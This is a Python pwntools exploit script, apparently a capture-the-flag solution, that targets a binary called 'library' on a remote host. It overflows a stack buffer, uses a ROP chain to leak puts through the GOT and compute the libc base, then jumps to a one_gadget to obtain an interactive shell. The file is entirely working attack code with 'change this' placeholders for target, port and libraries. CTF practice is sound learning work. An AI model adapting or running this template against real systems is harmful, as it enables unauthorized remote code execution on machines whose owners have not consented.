#!/usr/bin/python3
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './library' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
	_libc = '/lib/x86_64-linux-gnu/libc.so.6'
else:
	r = remote(ip, port)
	_libc = './libc.so.6' # change this

libc = ELF(_libc)
e = ELF(fname)
rop = ROP(e)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def libc_leak(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(e.got['puts'])
	payload += p64(e.plt['puts'])
	payload += p64(e.symbols['main'])
	sla('>', payload)
	rl()
	return u64(rl()[:-1].ljust(8, b'\x00'))

def get_shell(junk, base):
	og = [0x4f3d5, 0x4f432, 0x10a41c]
	payload = junk
	payload += p64(base + og[0])
	sla('>', payload)
	inter() 

def pwn():
	junk = b'A'*40
	leaked = libc_leak(junk)
	base = leaked - libc.symbols['puts']
	log.info('Leaked:    0x{:x}'.format(leaked))
	log.info('Libc base: 0x{:x}'.format(base))
	get_shell(junk, base)

if __name__ == '__main__':
	pwn()
